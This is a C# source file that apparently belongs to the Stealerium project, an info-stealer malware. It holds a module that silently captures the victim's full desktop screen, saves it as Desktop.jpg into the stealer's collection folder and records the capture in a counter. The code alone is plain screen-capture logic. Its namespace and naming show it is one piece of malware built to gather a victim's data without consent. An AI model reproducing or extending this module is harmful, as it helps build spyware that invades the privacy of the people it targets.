using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Stealerium.Helpers;

namespace Stealerium.Target.System
{
    internal static class DesktopScreenshot
    {
        public static void Make(string sSavePath)
        {
            try
            {
                var bounds = Screen.GetBounds(Point.Empty);
                using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (var g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }

                    bitmap.Save(sSavePath + "\\Desktop.jpg", ImageFormat.Jpeg);
                }

                Counter.DesktopScreenshot = true;
            }
            catch (Exception ex)
            {
                Logging.Log("DesktopScreenshot >> Failed to create\n" + ex, false);
            }
        }
    }
}